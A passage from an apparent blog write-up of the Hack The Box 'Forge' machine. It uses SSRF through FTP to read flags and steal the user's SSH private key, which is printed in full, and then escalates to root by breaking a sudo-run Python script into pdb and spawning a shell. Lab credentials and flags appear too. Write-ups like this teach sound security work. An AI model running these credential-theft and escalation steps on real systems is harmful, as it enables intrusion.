</code></pre></div><h2 id=access-to-the-machine>Access to the machine</h2><p>Now we have another way to try SSRF, but from <code>http://admin.forge.htb</code> and having FTP enabled (with credentials <code>user:heightofsecurity123!</code>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> ssrf.py <span class=code-dark-yellow>'http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@FORGE.HTB/'</span>
drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap
-rw-r-----    1 0        1000           33 Sep 12 13:01 user.txt

<span class=code-cyan>$</span> <span class=code-dark-green>python3</span> ssrf.py <span class=code-dark-yellow>'http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@FORGE.HTB/user.txt'</span>  
65d1bd86e04e41ae808a7965ff6e07c5
</code></pre></div><p>Now let&rsquo;s see if the FTP password is reused for SSH:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ssh</span> user@forge.htb
user@forge.htb: Permission denied (publickey).  
</code></pre></div><p>It is not. We need a private key to access the machine via SSH.</p><p>The FTP server seems to be pointing to the home directory of <code>user</code> (because we saw the <code>user.txt</code> flag). So we can try to access <code>~/.ssh/id_rsa</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> ssrf.py <span class=code-dark-yellow>'http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@FORGE.HTB/.ssh/id_rsa'</span> | <span class=code-dark-green>tee</span> id_rsa  
-----BEGIN OPENSSH PRIVATE KEY-----
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
shlLupso7WoS0AAAAKdXNlckBmb3JnZQE=
-----END OPENSSH PRIVATE KEY-----
</code></pre></div><h2 id=privilege-escalation-with-sudo>Privilege escalation with <code>sudo</code></h2><p>And now we have access to the machine. This user is allowed to execute a Python script as <code>root</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>chmod</span> 600 id_rsa

<span class=code-cyan>$</span> <span class=code-dark-green>ssh</span> -i id_rsa user@forge.htb
<span class=code-green>user@forge</span>:<span class=code-blue>~</span>$ sudo -l
Matching Defaults entries for user on forge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  

User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
</code></pre></div><p>This script starts a socket connection to allow a certain user execute some system commands:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>user@forge</span>:<span class=code-blue>~</span>$ cat /opt/remote-manage.py  
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/usr/bin/env</span> <span class=mtk3>python3</span>

<span class=mtk5>import</span> <span class="mtk8 mtku">socket</span>
<span class=mtk5>import</span> <span class="mtk8 mtku">random</span>
<span class=mtk5>import</span> <span class="mtk8 mtku">subprocess</span>
<span class=mtk5>import</span> <span class="mtk8 mtku">pdb</span>

<span class=mtk1>port</span> <span class=mtk5>=</span> <span class="mtk8 mtku">random</span><span class=mtk1>.</span><span class=mtk8>randint</span><span class=mtk1>(</span><span class=mtk6>1025</span><span class=mtk1>,</span> <span class=mtk6>65535</span><span class=mtk1>)</span>

<span class=mtk5>try</span><span class=mtk1>:</span>
    <span class=mtk1>sock</span> <span class=mtk5>=</span> <span class="mtk8 mtku">socket</span><span class=mtk1>.</span><span class="mtk8 mtku">socket</span><span class=mtk1>(</span><span class="mtk8 mtku">socket</span><span class=mtk1>.</span><span class=mtk1>AF_INET</span><span class=mtk1>,</span> <span class="mtk8 mtku">socket</span><span class=mtk1>.</span><span class=mtk1>SOCK_STREAM</span><span class=mtk1>)</span>
    <span class=mtk1>sock</span><span class=mtk1>.</span><span class=mtk8>setsockopt</span><span class=mtk1>(</span><span class="mtk8 mtku">socket</span><span class=mtk1>.</span><span class=mtk1>SOL_SOCKET</span><span class=mtk1>,</span> <span class="mtk8 mtku">socket</span><span class=mtk1>.</span><span class=mtk1>SO_REUSEADDR</span><span class=mtk1>,</span> <span class=mtk6>1</span><span class=mtk1>)</span>
    <span class=mtk1>sock</span><span class=mtk1>.</span><span class=mtk8>bind</span><span class=mtk1>((</span><span class=mtk4>'127.0.0.1'</span><span class=mtk1>,</span> <span class=mtk1>port</span><span class=mtk1>))</span>
    <span class=mtk1>sock</span><span class=mtk1>.</span><span class=mtk8>listen</span><span class=mtk1>(</span><span class=mtk6>1</span><span class=mtk1>)</span>
    <span class=mtk8>print</span><span class=mtk1>(</span><span class="mtk7 mtki">f</span><span class=mtk4>'Listening</span> <span class=mtk4>on</span> <span class=mtk4>localhost:</span><span class=mtk6>{</span><span class=mtk1>port</span><span class=mtk6>}</span><span class=mtk4>'</span><span class=mtk1>)</span>
    <span class=mtk1>(</span><span class=mtk1>clientsock</span><span class=mtk1>,</span> <span class=mtk1>addr</span><span class=mtk1>)</span> <span class=mtk5>=</span> <span class=mtk1>sock</span><span class=mtk1>.</span><span class=mtk8>accept</span><span class=mtk1>()</span>
    <span class=mtk1>clientsock</span><span class=mtk1>.</span><span class=mtk8>send</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Enter</span> <span class=mtk4>the</span> <span class=mtk4>secret</span> <span class=mtk4>passsword:</span> <span class=mtk4>'</span><span class=mtk1>)</span>

    <span class=mtk5>if</span> <span class=mtk1>clientsock</span><span class=mtk1>.</span><span class=mtk8>recv</span><span class=mtk1>(</span><span class=mtk6>1024</span><span class=mtk1>).</span><span class=mtk8>strip</span><span class=mtk1>().</span><span class=mtk8>decode</span><span class=mtk1>()</span> <span class=mtk5>!=</span> <span class=mtk4>'secretadminpassword'</span><span class=mtk1>:</span>
        <span class=mtk1>clientsock</span><span class=mtk1>.</span><span class=mtk8>send</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Wrong</span> <span class=mtk4>password!</span><span class=mtk6>\n</span><span class=mtk4>'</span><span class=mtk1>)</span>
    <span class=mtk5>else</span><span class=mtk1>:</span>
        <span class=mtk1>clientsock</span><span class=mtk1>.</span><span class=mtk8>send</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Welcome</span> <span class=mtk4>admin!</span><span class=mtk6>\n</span><span class=mtk4>'</span><span class=mtk1>)</span>

        <span class=mtk5>while</span> <span class=mtk6>True</span><span class=mtk1>:</span>
            <span class=mtk1>clientsock</span><span class=mtk1>.</span><span class=mtk8>send</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\n</span><span class=mtk4>What</span> <span class=mtk4>do</span> <span class=mtk4>you</span> <span class=mtk4>wanna</span> <span class=mtk4>do:</span> <span class=mtk6>\n</span><span class=mtk4>'</span><span class=mtk1>)</span>
            <span class=mtk1>clientsock</span><span class=mtk1>.</span><span class=mtk8>send</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'[1]</span> <span class=mtk4>View</span> <span class=mtk4>processes</span><span class=mtk6>\n</span><span class=mtk4>'</span><span class=mtk1>)</span>
            <span class=mtk1>clientsock</span><span class=mtk1>.</span><span class=mtk8>send</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'[2]</span> <span class=mtk4>View</span> <span class=mtk4>free</span> <span class=mtk4>memory</span><span class=mtk6>\n</span><span class=mtk4>'</span><span class=mtk1>)</span>
            <span class=mtk1>clientsock</span><span class=mtk1>.</span><span class=mtk8>send</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'[3]</span> <span class=mtk4>View</span> <span class=mtk4>listening</span> <span class=mtk4>sockets</span><span class=mtk6>\n</span><span class=mtk4>'</span><span class=mtk1>)</span>
            <span class=mtk1>clientsock</span><span class=mtk1>.</span><span class=mtk8>send</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'[4]</span> <span class=mtk4>Quit</span><span class=mtk6>\n</span><span class=mtk4>'</span><span class=mtk1>)</span>
            <span class=mtk1>option</span> <span class=mtk5>=</span> <span class="mtk8 mtku">int</span><span class=mtk1>(</span><span class=mtk1>clientsock</span><span class=mtk1>.</span><span class=mtk8>recv</span><span class=mtk1>(</span><span class=mtk6>1024</span><span class=mtk1>).</span><span class=mtk8>strip</span><span class=mtk1>())</span>

            <span class=mtk5>if</span> <span class=mtk1>option</span> <span class=mtk5>==</span> <span class=mtk6>1</span><span class=mtk1>:</span>
                <span class=mtk1>clientsock</span><span class=mtk1>.</span><span class=mtk8>send</span><span class=mtk1>(</span><span class="mtk8 mtku">subprocess</span><span class=mtk1>.</span><span class=mtk8>getoutput</span><span class=mtk1>(</span><span class=mtk4>'ps</span> <span class=mtk4>aux'</span><span class=mtk1>).</span><span class=mtk8>encode</span><span class=mtk1>())</span>
            <span class=mtk5>elif</span> <span class=mtk1>option</span> <span class=mtk5>==</span> <span class=mtk6>2</span><span class=mtk1>:</span>
                <span class=mtk1>clientsock</span><span class=mtk1>.</span><span class=mtk8>send</span><span class=mtk1>(</span><span class="mtk8 mtku">subprocess</span><span class=mtk1>.</span><span class=mtk8>getoutput</span><span class=mtk1>(</span><span class=mtk4>'df'</span><span class=mtk1>).</span><span class=mtk8>encode</span><span class=mtk1>())</span>
            <span class=mtk5>elif</span> <span class=mtk1>option</span> <span class=mtk5>==</span> <span class=mtk6>3</span><span class=mtk1>:</span>
                <span class=mtk1>clientsock</span><span class=mtk1>.</span><span class=mtk8>send</span><span class=mtk1>(</span><span class="mtk8 mtku">subprocess</span><span class=mtk1>.</span><span class=mtk8>getoutput</span><span class=mtk1>(</span><span class=mtk4>'ss</span> <span class=mtk4>-lnt'</span><span class=mtk1>).</span><span class=mtk8>encode</span><span class=mtk1>())</span>  
            <span class=mtk5>elif</span> <span class=mtk1>option</span> <span class=mtk5>==</span> <span class=mtk6>4</span><span class=mtk1>:</span>
                <span class=mtk1>clientsock</span><span class=mtk1>.</span><span class=mtk8>send</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Bye</span><span class=mtk6>\n</span><span class=mtk4>'</span><span class=mtk1>)</span>
                <span class=mtk5>break</span>

<span class=mtk5>except</span> <span class="mtk8 mtku">Exception</span> <span class=mtk5>as</span> <span class=mtk1>e</span><span class=mtk1>:</span>
    <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk1>e</span><span class=mtk1>)</span>
    <span class="mtk8 mtku">pdb</span><span class=mtk1>.</span><span class=mtk8>post_mortem</span><span class=mtk1>(</span><span class=mtk1>e</span><span class=mtk1>.</span><span class=mtk1>__traceback__</span><span class=mtk1>)</span>
<span class=mtk5>finally</span><span class=mtk1>:</span>
    <span class=mtk8>quit</span><span class=mtk1>()</span>
</code></pre></div><p>The commands are not vulnerable. In fact, the vulnerability here is the use of <code>pdb</code> if an exception is thrown. Once we enter in the <code>pdb</code> prompt, we can execute an interactive Python session (REPL) as <code>root</code> (because the script is executed with <code>sudo</code>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>user@forge</span>:<span class=code-blue>~</span>$ sudo /usr/bin/python3 /opt/remote-manage.py  
Listening on localhost:1423
</code></pre></div><p>First, we need to enter the password, which is written in the code in plain text (<code>secretadminpassword</code>). To trigger <code>pdb</code> we can enter a letter instead of a valid number (we will cause a <code>ValueError</code> exception):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>user@forge</span>:<span class=code-blue>~</span>$ telnet localhost 1423
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
Enter the secret passsword: secretadminpassword  
Welcome admin!

What do you wanna do:
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
x
</code></pre></div><p>And then we have the <code>pdb</code> prompt:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>user@forge</span>:<span class=code-blue>~</span>$ sudo /usr/bin/python3 /opt/remote-manage.py
Listening on localhost:1423
invalid literal for int() with base 10: b'x'
&gt; /opt/remote-manage.py(27)&lt;module&gt;()
-&gt; option = int(clientsock.recv(1024).strip())
(Pdb) ?

Documented commands (type help &lt;topic&gt;):
========================================
EOF    c          d        h         list      q        rv       undisplay  
a      cl         debug    help      ll        quit     s        unt
alias  clear      disable  ignore    longlist  r        source   until
args   commands   display  interact  n         restart  step     up
b      condition  down     j         next      return   tbreak   w
break  cont       enable   jump      p         retval   u        whatis
bt     continue   exit     l         pp        run      unalias  where

Miscellaneous help topics:
==========================
exec  pdb
</code></pre></div><p>If we type <code>interact</code>, we will get a Python REPL, and there we can spawn a shell:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>(Pdb) interact
*interactive*
&gt;&gt;&gt; import pty
&gt;&gt;&gt; pty.spawn('/bin/bash')  
</code></pre></div><p>Finally we have a shell as <code>root</code>, so we can read the <code>root.txt</code> flag:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>root@forge:/home/user# cat /root/root.txt  
3f3744e3624782a0fd2504a47923c347
</code></pre></div><div class="mt6 instapaper_ignoref">
</div></div><aside aria-label=aside class="w-20-l mt6-l aside-desktop">
<div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:2rem>
<p class="f5 b mb3">Contents of this write-up</p><nav id=TableOfContents>
<ul>
<li><a href=#port-scanning>Port scanning</a></li><li><a href=#web-enumeration>Web enumeration</a></li><li><a href=#testing-ssrf>Testing SSRF</a></li><li><a href=#finding-another-subdomain>Finding another subdomain</a></li><li><a href=#access-to-the-machine>Access to the machine</a></li><li><a href=#privilege-escalation-with-sudo>Privilege escalation with <code>sudo</code></a></li></ul></nav></div></aside></article></main><footer class="bg-black bottom-0 w-100 pa3" role=contentinfo>
<div class="flex justify-between">
<a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a>
<div style=margin-top:8px>
<div>
<div>
<a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
</div></div></div></div></footer></body></html>